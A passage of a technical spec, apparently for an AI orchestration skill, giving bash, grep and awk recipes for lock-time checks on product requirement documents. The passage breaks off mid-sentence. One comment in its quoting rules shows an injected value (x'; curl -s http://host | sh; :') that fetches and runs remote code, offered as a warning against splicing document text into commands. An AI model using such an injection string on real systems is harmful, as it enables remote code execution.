# Mechanical checks

No lens can run these. Each lens is briefed on one document and disposes rows one by one; these
checks compare documents, compare a document against its own indexes, or compare the current text
against the revision it amends. **The orchestrator runs them itself and records the result** — what
was checked, the result of each check, and for each miss the fix or the post-lock item — in the
review log's lock record.

**"By script" means programmatically rather than by eye. It does not mean a maintained CLI.** This
file lists each check with its exact method; the orchestrator writes a **throwaway script per run**,
against the repo in front of it, and throws it away. That is deliberate: every check below depends
on the target repo's layout — where the product docs live, how the PRD's tables are split, which
companions exist, what the base revision is — so a shipped checker would need to be configured for
each project before it could run at all, and a stale configuration fails silently, which is the one
failure mode these checks exist to prevent. Five conversions of locked PRDs in one project were run
this way and no drift in method was observed; that is five runs, one project, one author, and no
instrument that would have detected drift had it occurred.

If a shipped checker is ever wanted, it belongs **beside the review gate in the `agent-dispatch`
plugin**, where the gate's own CLI already lives and already knows how to be pointed at a repo. It
does not belong in this skill. This skill ships the method.

---

## How a result is recorded

**Every check reports exactly one of three results: PASS, MISS, or NOT-RUN with a reason.**

- **PASS** — the check ran, its subject existed and was non-empty, and the assertion held.
- **MISS** — the check ran and the assertion failed. Each miss carries its fix or its post-lock
  item.
- **NOT-RUN** — the check could not execute: a file it reads is absent or empty, an enumeration it
  depends on came back empty, a base revision does not exist, a tool is missing. The reason is
  recorded in the same words as the check's own guard.

**A check asserts that its subject exists and is non-empty before it asserts anything about the
subject's content.** An empty search result over an absent, empty or mistyped subject is **NOT-RUN,
never PASS.** The worked case is check 12: run its word count against a mistyped slug and it prints
`0` and exits `0`. Zero words is under every budget, so a typo in a path reads as the most
comfortable pass in this file. Every check below can fail that way, which is why the record has
three states rather than clean-or-miss.

**The subject and the applicable set are two different things, and only the first drives NOT-RUN.**
The subject is the file, section or table a check reads; the applicable set is what the check finds
in it. NOT-RUN belongs to a subject that is **missing, unreadable or unparseable**. A subject that
exists, parses, and legitimately carries **zero** members — a constants table with no data rows, a
results companion with no answered question, a copy companion whose states offer no labels — yields
an empty applicable set; the check's assertion is satisfied over it, and **that is a PASS**. Check 2
already says so for the Legend derivations, and the rest of this file follows it. The alternative is
worse than pedantry: lock requires zero NOT-RUNs, so calling a legitimate empty set NOT-RUN prices a
fully specified product at an owner fence and teaches an author to invent uncertainty to avoid one.

Those two states look identical at the point of measurement, so **every check that can produce an
empty set records which of the two it observed and what told them apart**. A parsed-but-empty table
is told from an absent one by the header and separator row the parse found; a results companion with
no answered question from one whose sections the extraction marker missed by whether the file
carries any `##` heading at all; a copy companion that offers no labels from one whose fields were
renamed by whether the `- Actions:` and `- Variant:` lines parsed. **A check that cannot state that
test does not get the PASS.** NOT-RUN exists so that "I did not look" cannot be spelled "clean", and
a PASS over a skipped subject is that same defect wearing the better word.

Where a set is non-empty **by construction** — this document's cites of its own rows, the case
tables, the dispositionable cells, the declared companion paths, the test-controls map — an empty
result is an extraction failure and stays NOT-RUN. Each such check says so in its own guard, and
the reason it gives is the construction, not the emptiness.

**"By construction" is a claim about the format, and it has to be checked against the format rather
than assumed.** Check 11 asserted that Markdown links were non-empty by construction "because the
Companions line carries four"; the Companions line uses backticked paths and carries none, so the
guard was NOT-RUN on every conforming document and, where an unrelated linked file happened to sit
in the tree, passed on that file instead of on the companions. Before writing that a set cannot be
empty, instantiate the documents and count it.

Mechanically, that is three habits. Every throwaway script opens with

```bash
set -euo pipefail
```

so a failed producer in a pipeline cannot be laundered into an empty result by its consumer. Every
check that reads a file guards it:

```bash
[ -s "$prd" ] || { echo "NOT-RUN: $prd is absent or empty"; exit 3; }
```

And every check that enumerates a set before comparing it asserts the enumeration is non-empty:

```bash
[ -s "$labels" ] || { echo "NOT-RUN: no labels extracted from $copy"; exit 3; }
```

A guard only guards if its message escapes the capture. Writing the extraction as
`parse_constants "$prd" > "$constants"` with the `NOT-RUN:` echo inside the function put that line
**into `$constants`**, which then read as a one-element constants set — observed on a fixture while
writing check 7. Guards print outside the redirect, or to stderr.

Under `set -e`, a `grep` whose empty output is the passing case returns `1` and would abort the
script; write those as `grep … || true` and read the **output**, not the exit status — and remember
that an empty output is a PASS only once the subject guard above it has run.

**Lock requires zero NOT-RUNs**, or an owner fence that accepts each remaining NOT-RUN by name and
says why. The one standing exception is the diff checks on a first lock: the Applicability section
below states that reason in advance, so recording them NOT-RUN with that reason needs no fence.
Every other NOT-RUN does.

## Standing rules for every command

Each command block below assumes this header, with both parameters substituted:

```bash
set -euo pipefail
docs="{{product-docs-dir}}"    # a literal, shell-quoted path: not a glob, not an expansion
slug="<prd-slug>"
prd="$docs/$slug.md"
journeys="$docs/$slug-journeys.md"
copy="$docs/$slug-copy.md"
fences="$docs/$slug-fences.md"
oq="$docs/$slug-oq-results.md"
```

**Document-derived text is never interpolated into a command string.** A label, a constant name, a
heading, an ID or any other value read out of a document is passed as a **quoted shell variable**,
with `--fixed-strings` so it is matched literally and with `-e` (or a trailing `--` before file
arguments) so a value beginning with `-` cannot become an option. These checks run at lock time,
over a document the operator may not have authored — the conversion path points this skill at
someone else's locked PRD — so the text is untrusted input:

```bash
# WRONG — the label is spliced into the command text. A copy state whose action reads
# x'; curl -s http://host | sh; :'  executes at lock time.
grep -rnF '<label text>' {{product-docs-dir}} --include='*.md'

# RIGHT — the label is data, and the path is quoted.
while IFS= read -r label; do
  grep -rn --fixed-strings --include='*.md' -e "$label" -- "$docs" || true
done < "$labels"
```

**Every path is quoted.** `"$docs"`, `"$prd"`, `"$docs/$slug-copy.md"`. The substituted value of
`{{product-docs-dir}}` must be a literal, shell-quoted path. Unquoted, a path containing a space
word-splits, the search runs against arguments nobody intended, it hits nothing — and a check whose
pass rule is "no hits" reads that fail-open as a PASS on the lock gate.

**Name the regex engine.** Three dialects appear in this file, and a command that assumes the wrong
one fails silently rather than loudly — see check 12, where an awk word-boundary escape emptied an
extraction that then read as clean. `awk` is the third: BSD awk has no word-boundary escape at all,
GNU awk spells it `\y`, and neither accepts `--` as an end-of-options marker for file arguments, so
an awk pattern here uses an explicit character class instead of a boundary escape and passes its
file without `--`. POSIX ERE has no lookaround: `grep -E` errors on `(?<!…)` and `(?=…)`,
and BSD `grep` has no `-P` at all. Where a pattern below uses a lookahead or a lookbehind, run it
under `perl -ne`, `python3 -m re`, or `rg -P`, and record in the lock record which one the run used.

Never paste a path or a pattern from another project's run.

## Applicability

**Checks 1–7, 10–13 and 15–20 run on both paths** — authoring and conversion — every time they are
run at all.

**Check 8's second direction, check 9 and check 14 are DIFF CHECKS.** They compare this document
against the revision it amends, so they run **on the conversion path and on any re-lock**. On a
first lock there is no prior locked revision: `git show "$lockbase":…` is a fatal error, and
check 8's "every touched ID is carried by a fence" fails for every ID in the document, all of which
are new. On a first lock each is recorded **NOT-RUN (reason: first lock, no prior locked
revision)**. Check 8's first direction — every row the fence map names still exists — reads only
the current text and runs on both paths.

### The two baselines

**A diff check needs two immutable SHAs, not one, because two different questions are being asked.**
Both are resolved once, at round 1, and **both are recorded in the fence-file header** beside the
review-log path. Every diff check records the `(baseline, head)` pair it ran against alongside its
result, **naming which of the two baselines it used**; a result whose pair is not recorded does not
carry forward to a later run.

- **The preservation baseline** — the commit at which this document was most recently locked: the
  commit whose tree carries the `Status: locked (<date>)` the amendment starts from. It is not the
  branch point, not `origin/main`, and not the last commit that touched the file. **Check 9 uses
  this one**, because check 9 asks whether IDs, priorities and statuses have been preserved *since
  lock*. The lock is the promise, so the lock commit is the only thing worth comparing against.
- **The change baseline** — `git merge-base <trunk> HEAD`, where `<trunk>` is the branch this
  amendment targets. **Check 8's second direction and check 14 use this one**, because they ask
  what *this amendment* changed and which ticks it may attribute to its own change record.

```bash
lockbase="<sha recorded in the fence header>"     # preservation: the last lock commit
changebase="$(git merge-base <trunk> HEAD)"       # change: this amendment's fork point
head="$(git rev-parse HEAD)"
```

**The two frequently coincide** — when nothing has landed on the trunk since the lock, the merge
base *is* the lock commit — and they are still recorded as two values, because a run cannot tell
from a single SHA which of the two jobs it did.

**Swapping them produces a wrong verdict in each direction.**

- Check 9 against the **change** baseline is a **false PASS**. Anything renumbered or re-statused on
  the trunk after the lock sits *below* the merge base, so the check never looks at it and reports
  the lock promise intact while it is broken.
- Check 8 against the **preservation** baseline is a **false MISS**. Every row another change landed
  on the trunk since the lock enters this amendment's evidence, and check 8 then demands this
  amendment's fences authorize rows somebody else already settled. **A change already authorized on
  the trunk is not this amendment's to fence.** Check 14 mis-scopes the same way in the quieter
  direction: it collects ticks another change flipped and files them in this amendment's lock
  record, so what it reports is not a fact about this amendment at all.

**Worked verification — the A/B/C ancestry case.** Three commits, over **the real six-column
requirement schema** `| ID | Release | Pri | Requirement | Status | Commit PR |`, plus a copy index
and a metrics table, because a fixture whose columns differ from the schema the check runs against
verifies nothing — see check 9, where exactly that let a wrong recipe pass its own verification.
`A` locks the document with `R1.1` at `P0`/`aligned` and `R2.1` at `P1`/`aligned`. `B` lands on the
trunk and flips **`R1.1`'s Status only**, `aligned` → `done`, leaving every other cell of that row
untouched. The amendment branches from `B`, and `C` moves `R2.1` from `P1` to `P2`. `main` stays at
`B`, so `git merge-base main HEAD` resolves to `B`. Run against that fixture:

| Run | What it reports |
|---|---|
| `git diff -U0 A...HEAD` | `R1.1` **and** `R2.1` |
| `git diff -U0 A..HEAD` | `R1.1` **and** `R2.1` — byte-identical to the line above |
| `git diff -U0 B...HEAD` | `R2.1` only |

`A` is an ancestor of `HEAD` — `git merge-base --is-ancestor A HEAD` succeeds — and the merge base
of an ancestor with its descendant is that ancestor, so `A...HEAD` **is** `A..HEAD` and the third
dot excludes nothing. Three dots are still the form to write, because a baseline is not always an
ancestor; what they cannot do is the job the preceding paragraphs give to the second SHA. What
separates `R1.1` from `R2.1` above is not the dot count. It is which commit is on the left.

Check 9 wants the first row of that table: `R1.1`'s Status went from `aligned` to `done` since the
lock, and the lock record has to account for it. Check 8 wants the third: `R2.1` is what this
amendment changed and what its fences must carry. Read across both and `R1.1` is the residue —
inside the since-lock delta, outside this amendment's delta — and that residue is **not a MISS
against this amendment's fences**. `trip()` is check 9's parse, which reads its columns **by header
name**:

```bash
trip() { git show "$1:$prd" | awk -F'|' -f bycolumn.awk | sort; }
comm -23 <(diff <(trip "$lockbase")   <(trip HEAD) | grep -E '^[<>]' | sort -u) \
         <(diff <(trip "$changebase") <(trip HEAD) | grep -E '^[<>]' | sort -u)
```

On the fixture that prints

```
< R1.1|P0|aligned
> R1.1|P0|done
```

and nothing else: the trunk's status-only change, named, and separated from the amendment's own.
Check 9 asserts a fence carries each line of that residue; it does not require that fence to be
dated in this amendment.

**The status-only mutation is in this fixture deliberately, and it is the regression guard.** Run
the same two commands with a *positional* parse of the requirement rows — `$2"|"$3"|"$4`, which on
the six-column schema reads ID, **Release** and Pri and never touches Status — and both `trip(A)`
and `trip(HEAD)` contain `R1.1|v1|P0`. The residue is then **empty and the recipe exits 0**: a
silent PASS over precisely the class check 9 exists to catch. If this verification is ever re-run
and the residue comes back empty, the parse has regressed.

---

## The carried-over checks

### 1. Cross-PRD consistency, both directions

**What.** Every PRD this document cites **or is cited by** — the direction does not matter and the
citation need not be reciprocal.

**Method.** Two halves, and each grep serves exactly one of them.

*Outbound* — read off this document alone. This grep necessarily hits the document under test;
that is the point of it. Collect every markdown link whose target is another `.md` file, plus every
unlinked cite naming a sibling by one of the `{{sibling-document-name}}` values the build contract
carries:

```bash
[ -s "$prd" ] || { echo "NOT-RUN: $prd is absent or empty"; exit 3; }
grep -nE '\[[^]]*\]\([^)]*\.md[^)]*\)' -- "$prd" || true
```

*Inbound* — **not derivable from this document**, so enumerate the sibling PRDs and their
companions in `"$docs"` and search them for two things: path or link references to this PRD's slug,
and this document's own requirement-section prefixes, derived from its `### <n>.` headings (section
7 gives `R7.`). This grep must **exclude** the document under test and its own companions; their
hits are the outbound half.

```bash
prefixes="$(grep -oE '^### [0-9]+\.' -- "$prd" | grep -oE '[0-9]+' | sort -un \
  | sed 's/^/R/; s/$/\\./' | paste -sd'|' -)"
[ -n "$prefixes" ] || { echo "NOT-RUN: no requirement-section headings found in $prd"; exit 3; }
grep -rnE --include='*.md' --exclude="$slug*.md" -e "$slug|($prefixes)[0-9]" -- "$docs" || true
```

Do **not** search for the bare ID families as a class. Every sibling carries `R…`, `E…` and `M…`
IDs of its own, so that alternation matches nearly every sibling document in the tree and hands the
orchestrator a near-universal set to prune by hand — which puts the memory-based enumeration back
exactly where this check removed it.

Every pair the two sets produce gets all five checks:

a. **Obligations agree both ways.** Every line in this PRD's outbound obligations table that names
   another document has its counterpart in that document's inbound table, and each side names the
   rows that carry it. A line with no counterpart is a defect on both ends, not one.
b. **Shared rows agree on priority.** Where one document says a row "moves into" or "is in" a build
   phase, the other's `Pri` cell says the same. A conditional in one ("P1 unless the import lands
   first") is matched in the other or appears in neither. This comparison is only meaningful once
   check 19 has confirmed each document declares exactly one priority semantic.
c. **Every cross-PRD cite names its owning document in its visible label** — "the device
   document's `R6.27`", never a bare `R6.27` — because the row-ID families repeat across documents
   and a bare ID resolves to the wrong row in the reader's head. Check this **by target, not by
   label shape**: collect every `[label](target)` whose target has a path part resolving to a file
   other than this document or its own companions, and assert the label contains one of the
   `{{sibling-document-name}}` values. Flag every link that does not.

   ```bash
   grep -onE '\[[^]]*\]\([^)]*\)' -- "$prd" || true
   ```

   Then the unlinked cite, which no link pattern can see. Search this document for bare ID tokens
   whose section prefix or family this document does not own, and read each hit: one whose
   surrounding text names no owning document is a defect.

   ```bash
   id_cite='(^|[^`[:alnum:]./-])(R[0-9]+\.[0-9]+[a-z]?|E[0-9]+|M[0-9]+|F[0-9]+)\b'
   grep -nE "$id_cite" -- "$prd" || true
   ```

   This document cites its own rows constantly, so an empty result here is NOT-RUN, not PASS.
d. **Retired and moved IDs are recorded on both ends** — retired in the source document's
   Traceability retired-ID list, and recorded in the destination that now owns the rule.
e. **Fences are qualified by document.** Fence numbering is per PRD, so a fence cited from another
   PRD carries its owning document in the label exactly as a row does.

**Failure looks like.** An obligation stated on one side only; the same row at P0 here and P1
there; `[row R6.27](../device.md)` whose label names no document; a bare `R6.27` in a sentence; an
ID retired in the Legend but never recorded where it went; an `F12` cite that does not say whose
`F12`.

### 2. Index sync

**What.** Every index inside this document agrees with the content it indexes.

**Method.** Derive the fence-to-row map **from the fence file** — parse each `### F<n>` section's
**Carried by** line and build the map programmatically; do not read the map section and trust it.
Diff the derived map against the fence file's own **Fence → row map** section. The `Carried by`
line is a comma-separated list of bare IDs, each optionally prefixed by its owning document, so the
parse is literal; a `Carried by` that does not parse is a MISS, not a NOT-RUN — the grammar is part
of the format.

Then cross-check the Legend's lists (constants and closure gates, build dependencies, the two
bullets for P0 rows deferring to an open question with no interim rule and for interims stated) and
the Surfaces table's copy states against the marks in the companions: every copy state named under
a surface exists in the copy companion, every state in the copy companion appears under exactly one
surface unless the Surfaces preamble declares it shared, and phase marks agree between the two.

**Derive the Legend/Open-Questions condition rather than asserting it.** The lock condition is
stated in two places and computed in none, so compute it here, in both directions:

- For every Open Questions row whose `Interim rule` cell is **empty**, take every ID in its `Feeds`
  cell whose row's `Pri` is `P0`, and assert that ID appears in the Legend's "P0 rows that defer to
  an open question with no interim rule" bullet.
- Assert the reverse: no ID appears in that bullet that this derivation does not produce.
- Run the same two directions for the **Interim stated** bullet, from the rows whose open question
  *does* carry an interim rule. That derivation is **not** `Pri`-filtered, and the asymmetry is
  deliberate: the first list answers "can the first build start?", which is inherently a P0
  question, while this one answers "which rows run under a named rule and must be re-checked when
  the question closes?", which has no reason to be P0-only — and a metric row, which carries no
  `Pri` column at all, can only ever appear here. Filtering this list by `Pri` would make such a row
  underivable and then fail the reverse direction for being listed. The two bullets are never
  merged, so the two derivations stay separate.

Subject guard: if the Open Questions section is absent or its table does not parse, this is
NOT-RUN. If the table parses and carries zero rows, the derived sets are legitimately empty and
both Legend bullets must be empty too — that is a PASS.

**Failure looks like.** A fence whose Carried-by names a row the map omits; a map line reading "see
the lists above" instead of naming rows; a surface listing a copy state the companion does not
have; a phase mark on a state in one file and not the other; a P0 row deferring to an
interim-less open question that the Legend's bullet never names. Every miss is an editorial edit —
fix it before the round, not after.

### 3. Latent-decision inventory

**What.** The decisions the document has already made without anyone noticing it made them.

**Method.** Enumerate four classes and turn each hit into an Open Question or an owner adjudication
**before** the pre-lock round. Each class has an operation; none of them is a judgment made from
memory.

- **Constants without an OQ** — a named constant in the constants-and-closure-gates table whose
  closure-evidence cell names no open question. Parse the table; assert each `Closure evidence`
  cell carries an OQ number that resolves in the Open Questions table.
- **Copy states with no producing row** — an `E<n>` in the copy companion that no requirement row
  causes. Parse the copy companion's `E<n>` sections, and for each assert some requirement row's
  text or the copy index's `Owning rows` cell names it.
- **Rows an upstream document places higher** — inputs are the parameterized upstream paths
  `{{upstream-vision-path}}` and `{{upstream-strategy-path}}`, plus every sibling PRD the build
  contract names. Operation: grep those documents for this PRD's row IDs and for the product-area
  name, and produce the list of hits with each cited row's local `Pri`. The orchestrator reads each
  hit against that `Pri`; a capability an upstream document puts in the first build phase that a
  row here marks P1 or P2 is a latent decision. If the upstream paths are unset or the files are
  absent, this class is NOT-RUN with that reason — it is not a PASS.
- **Undefined terms the rows lean on** — tokenize the bold and quoted terms out of the
  `Requirement` cells of every requirement table and out of the `Given` and `Assert` cells of the
  journeys companion, and diff them against the term list parsed from the Vocabulary section. Build
  the term list from the rows, not from memory.

  ```bash
  vocab="$(mktemp)"; terms="$(mktemp)"
  sed -n '/^### Vocabulary$/,/^### /p' "$prd" \
    | grep -oE '^- \*\*[^*]+\*\*' | sed -E 's/^- \*\*//; s/\*\*$//' | sort -u > "$vocab"
  [ -s "$vocab" ] || { echo "NOT-RUN: Vocabulary list parsed empty"; exit 3; }
  grep -ohE '\*\*[^*]+\*\*|"[^"]+"' -- "$prd" "$journeys" \
    | sed -E 's/^\*\*//; s/\*\*$//; s/^"//; s/"$//' | sort -u > "$terms"
  comm -23 "$terms" "$vocab"
  ```

  The output includes quoted copy labels (check 13's subject) and bold used for emphasis, so it is
  a list to read; what it cannot do is miss a term the rows use.

**Failure looks like.** A named constant with no open question that closes it; a copy state no row
causes; a row at P1 or P2 that an upstream document places in the first build phase; a term a
requirement or an Assert leans on that Vocabulary does not define. Each of those is a decision this
document has already made and has not recorded as one.

---

## The added checks

### 4. Row-transition index against the rows

**Method.** Parse the row-transition table (`Starting state | Event | Result | Rows`).

**First, agree the state vocabulary, before using it as a basis.** Build set A from the transition
table's `Starting state` and `Result` cells; build set B from the Vocabulary terms marked as states
(`- **<term>** (state) — …`). Assert both are non-empty — an empty one is NOT-RUN — and assert
`A = B`. A name in one and not the other is a **MISS reported before the rest of this check runs**:
enumerating from Vocabulary alone means a state the rows use and Vocabulary omits silently shrinks
the search below, and the check then passes on a smaller question than the one it claims to ask.

Then, with the agreed set: separately enumerate every requirement row whose text changes the state
of the entity this PRD governs, by searching the requirement tables for those state names, passed
as quoted variables. For each such row, assert its ID appears in at least one `Rows` cell of the
transition table, and that no two table lines carry the same `Starting state` + `Event` pair.
Enumerate the routes **from the rows**, not from the table and not from memory — the table is the
thing under test.

Keep that grep wide: it matches rows that **mention** a state, while the criterion is rows that
**change** one, so it will always return some rows that belong in neither. Dispose them, do not
narrow the grep — narrowing it to transition verbs would reintroduce the memory-based enumeration
this check exists to remove. A row that describes behaviour **in** a state without moving the entity
between states — a per-state response or display rule — is **disposed, and the disposition is
recorded**, so that "I did not see it" and "I saw it and disposed it" do not look alike in the lock
record. The inverse is the trap worth the attention: a row that does transition but is phrased in
per-state language is still a MISS.

**Failure looks like.** A state the rows use that Vocabulary does not mark; a route a row can cause
that the table omits (two reviewers caught one this way in the first rewrite of this format); the
same route listed twice; a `Rows` cell naming an ID that no longer exists.

### 5. Variant set, both directions

**Method.** The copy companion writes one `### E<n> — <state>` section per state, each field on
its own line as `- <Field>: <value>`, so the extraction keys on a literal prefix. For each state,
build set A from its `- Variant: "…"` lines. Build set B from the requirement row named in that
state's `- Variants enumerated by:` field: read that row in the PRD and parse the variant set it
enumerates. Take the set difference in **both** directions per state; both must be empty.

```bash
[ -s "$copy" ] || { echo "NOT-RUN: $copy is absent or empty"; exit 3; }
grep -qE '^### E[0-9]+ ' -- "$copy" \
  || { echo "NOT-RUN: no E<n> sections parsed from $copy"; exit 3; }
grep -nE '^- (Variant|Variants enumerated by):' -- "$copy" || true
```

Dispositions, so that nothing lands as an N/A:

- A state with `- Variant:` lines whose `- Variants enumerated by:` reads `none` is a **MISS** —
  the variants are untestable without matching on wording, which process rule 9 forbids.
- A state whose `- Variants enumerated by:` names a row that does not exist is a **MISS**.
- A state with no variants and `- Variants enumerated by: none` is a PASS: both sets are empty and
  they agree.
- An absent copy companion is **NOT-RUN**, never an N/A.

**Failure looks like.** A variant in the copy file that no row enumerates — untestable without
matching on wording. Or an enumerated variant with no copy — a state the builder must invent text
for. Or a marker pointing at a row a renumber-free amendment nonetheless deleted.

### 6. Case references and copy-state coverage

**Method.** Collect every ID from the `Rows` cells of the journeys companion — the transition index
`T1..Tn` and every `UJ n` table — and assert each resolves to a live row ID in the PRD body; an ID
that resolves only to the retired list is a failure, not a pass. Then collect every `E<n>` from the
copy companion and assert each appears in at least one case. Both collections are guarded: an empty
`Rows` set or an empty `E<n>` set is NOT-RUN, since both files carry them by construction.

**Failure looks like.** A dangling `Rows` cite after a renumber that should never have happened; a
copy state with no case, which means nothing observes it.

### 7. Legend constants named in an owning row

**Method.** Parse the `Constant` column of the constants-and-closure-gates table. The parse has
**three** outcomes, and the header row is what tells the last two apart:

```bash
constants="$(mktemp)"
grep -qE '^\| *Constant *\|' -- "$prd" \
  || { echo "NOT-RUN: no constants-and-closure-gates table header in $prd"; exit 3; }
awk -F'|' '/^\| *Constant *\|/ {h=1; next} h && /^\| *-+/ {next}
           h && /^\|/ {gsub(/^ +| +$/,"",$2); print $2; next} h {exit}' "$prd" > "$constants"
[ -s "$constants" ] || { echo "PASS: constants table parses and declares zero constants"; exit 0; }
```

- **No `| Constant |` header** — the table is absent, renamed or reshaped. The subject did not
  parse, so this is **NOT-RUN**, and the reason names the header the parse looked for.
- **Header and separator present, zero data rows** — the subject parsed and the applicable set is
  legitimately empty. This product declares no constant, there is nothing for the assertions below
  to range over, and that is a **PASS**. Whether a product with no named constant is *right* is
  check 3's first class, not this check's; a product that is fully specified has no provisional
  constant to gate, and this check is not the place to make it produce one.
- **Data rows** — run both assertions below.

**Worked verification — the no-provisional-constants state.** Run that parse against three versions
of the same PRD. As shipped, with one data row, it prints `max-destination-length` and the
assertions run. With the data row deleted but the header and separator left in place, it prints
`PASS: constants table parses and declares zero constants`. With the whole table deleted — header
included — it prints `NOT-RUN: no constants-and-closure-gates table header`. The middle state is the
one the earlier wording of this check reported NOT-RUN, and it is the state of every PRD whose
numbers are all settled.

Then, for a non-empty set, **restrict the search to the requirement tables**, by deriving their
line ranges from the `### <n>.` headings, and require a hit **inside a requirement row** — a table
line whose first cell is an `R<section>.<n>` ID. "At least one hit outside the Legend" is not
enough: it passes when the only other hit is in the Open Questions table, the build-dependencies
table or the Surfaces table, which is exactly the state this check exists to catch.

```bash
rows="$(mktemp)"
awk '/^### [0-9]+\./ {inseq=1} /^## [^#]/ {inseq=0} \
     inseq && /^\| *R[0-9]+\.[0-9]+[a-z]? *\|/' "$prd" > "$rows"
[ -s "$rows" ] || { echo "NOT-RUN: no requirement rows parsed from $prd"; exit 3; }
while IFS= read -r constant; do
  [ -n "$constant" ] || continue
  grep -qF -e "$constant" -- "$rows" \
    || printf 'MISS  %s — named in no requirement row\n' "$constant"
done < "$constants"
```

**Then the reverse assertion.** For each line of the constants table, for every ID in its
`Owning rows` cell: assert the ID resolves to a live requirement row, **and** assert that row's
text names the constant. A row listed as owning a constant it does not name is a miss on the same
footing as a constant no row names — the table claims a relationship the text does not carry.

**Failure looks like.** A constant that exists only in the Legend — a product parameter with no row
that uses it, which means no row is verifiable against it. Or a constant whose only mention outside
the Legend is in the Open Questions or build-dependencies table, which the old "outside the Legend"
pass rule admitted while its own failure line named it.

### 8. Fence map against content

**Method.** Two directions, with different applicability.

*Direction 1 — map against current text (both paths).* For every line of the fence file's
**Fence → row map**, assert each row, case, copy state and sibling fence it names still exists in
the current text.

*Direction 2 — changed content against the fences (diff check).* **This direction runs against the
change baseline**, `$changebase` — what *this amendment* changed. Run it against the preservation
baseline instead and every row the trunk moved since the lock arrives here unfenced, and the check
reports somebody else's settled change as this amendment's unratified WHAT. Derive what changed from
the **changed lines**, not from ID tokens found in the diff:

```bash
diff_out="$(mktemp)"; changed="$(mktemp)"
id_lines="$(mktemp)"; idless_lines="$(mktemp)"
git diff -U0 "$changebase"...HEAD -- "$docs" > "$diff_out"
[ -s "$diff_out" ] \
  || { echo "NOT-RUN: empty diff against $changebase — wrong baseline, or nothing changed"; exit 3; }
grep -E '^[+-]' -- "$diff_out" | grep -vE '^(\+\+\+|---)' > "$changed"
[ -s "$changed" ] || { echo "NOT-RUN: no changed lines extracted from the diff"; exit 3; }
id_re='(R[0-9]+\.[0-9]+[a-z]?|E[0-9]+|M[0-9]+|T[0-9]+|UJ[0-9]+\.[0-9]+-[a-z])'
grep -E "^[+-]\| *$id_re *\|" -- "$changed" > "$id_lines" || true
grep -vE "^[+-]\| *$id_re *\|" -- "$changed" > "$idless_lines" || true
```

Then:

a. **A changed line that is a row of a dispositionable table** — its first cell is one of those IDs
   — must have that ID in some fence's **Carried by**, using the map derived in check 2.
b. **A changed line carrying no ID** must match an entry on this round's fix file authorized as
   editorial, or it is reported as an **unattributed change**. These are the lines an ID grep
   cannot see and the ones most worth seeing: the Legend's priority bullets, the phase rule, the
   status vocabulary, a Vocabulary bullet, either build-contract paragraph, the Labels or
   Placeholders rules, the harness statement, a journey's preamble line, the Surfaces preamble.
   SKILL.md names "a change to Legend priority semantics" as explicitly not editorial, and deriving
   the changed set from ID tokens yields the empty set for every one of them — an assertion that is
   vacuously true.

**The guard is the partition, not the emptiness of either part.** `$id_lines` and `$idless_lines`
are a partition of `$changed`, so assert that their line counts sum to `$changed`'s. That assertion
is what catches the extraction failure — an `id_re` that stopped matching, a diff format the greps
did not anticipate — and it holds whichever part is empty:

```bash
[ "$(( $(wc -l < "$id_lines") + $(wc -l < "$idless_lines") ))" -eq "$(wc -l < "$changed")" ] \
  || { echo "NOT-RUN: the ID/ID-less partition did not cover the changed set"; exit 3; }
```

Either part may then be legitimately empty, and a legitimately empty part is a **PASS** for its
direction: an amendment that rewrote only the Legend's priority bullet has an empty `$id_lines` and
(a) is satisfied over nothing, while (b) does all the work; an amendment that touched only table
rows has an empty `$idless_lines` and the reverse holds. The earlier rule — "an empty ID set against
a non-empty diff is NOT-RUN" — made the first of those two a lock-blocking NOT-RUN, which is exactly
backwards: SKILL.md names a Legend priority change as the one thing that is explicitly **not**
editorial, so a pure-Legend amendment is a case this check most needs to reach a verdict on.

Record the `(changebase, head)` pair with the result, naming the baseline.

**Failure looks like.** A map entry pointing at text the rewrite deleted. A row changed on the
branch that no fence carries — an unratified WHAT, which is the defect this check exists for. Or a
Legend priority bullet rewritten on the branch with no fence and no editorial entry: an
unattributed change, which the ID-token form of this check could not see at all.

### 9. ID, priority and status diff against the base

**Method.** A diff check (see Applicability). **This check runs against the preservation baseline**,
`$lockbase` — the commit at which the document was last locked — because the question is whether
the lock's promise has held, and only the lock commit carries that promise. Run it against the change
baseline instead and a renumber or a status flip that landed on the trunk after the lock sits below
the merge base, invisible, and the check reports preserved over a document that was not.

Extract `(ID, Pri, Status)` triples from the baseline revision and from `HEAD` and diff them — but
the triple's shape is **per family**, because only the requirement tables have a `Pri` column:

| Family | Table | Columns read |
|---|---|---|
| `R<section>.<n>` | the requirement tables | `ID`, `Pri`, `Status` |
| `E<n>` | the PRD's copy index | `ID`, `Status` (no `Pri`) |
| `E<n>` | the copy companion's per-state `- Status:` field | `ID`, `Status` (no `Pri`) |
| `M<n>` | the success-metrics table | `ID`, `Status` (no `Pri`) |

For the families with no priority column, write the `Pri` field as a literal `—`. Do not synthesize
one and do not let a missing column read as a changed value.

**Read those columns by header NAME, never by position.** The three tables put `Status` in three
different places — the requirement tables' header is
`| ID | Release | Pri | Requirement | Status | Commit PR |`, so with `awk -F'|'` the cells are
`ID=$2, Release=$3, Pri=$4, Status=$6`; the copy index is
`| ID | State | Surface | Owning rows | Status |`, `Status=$6`; and the metrics table is
`| ID | Metric | Definition … | Candidate target | Method | Status |`, `Status=$7`. A positional
recipe cannot be right for all three, and the failure is silent: an earlier form of this check
printed `$2"|"$3"|"$4`, which on the requirement schema is `(ID, Release, Pri)` — **Status was never
read at all**, so every status-only change produced identical triples on both sides and the check
reported clean. Parse the header row, map names to indices, and pull `ID`, `Pri` and `Status` out of
that map:

```awk
# bycolumn.awk — run as: awk -F'|' -f bycolumn.awk <file>
function trim(s){ gsub(/^[ \t]+|[ \t]+$/,"",s); return s }
{ line = $0 }
!/^\|/ { split("", H); HNF = 0; prev = line; next }     # a table ended: the map dies with it
/^\|[ \t]*:?-+[-|: \t]*\|[ \t]*$/ {                     # separator: the line above was the header
  split("", H); HNF = split(prev, C, "|")
  for (i = 2; i < HNF; i++) H[trim(C[i])] = i
  prev = line; next
}
{
  if (("ID" in H) && ("Status" in H)) {
    if (NF != HNF)
      printf "PARSE-MISS: row %s has %d cells, header has %d\n", trim($2), NF-2, HNF-2 > "/dev/stderr"
    else {
      id = trim($H["ID"])
      if (id ~ /^(R[0-9]+\.[0-9]+[a-z]?|E[0-9]+|M[0-9]+)$/)
        print id "|" (("Pri" in H) ? trim($H["Pri"]) : "—") "|" trim($H["Status"])
    }
  }
  prev = line
}
```

Four things in that script are load-bearing. A header row is identified by **the separator row
underneath it**, not by its content, which is what lets one pass handle every table in the file. The
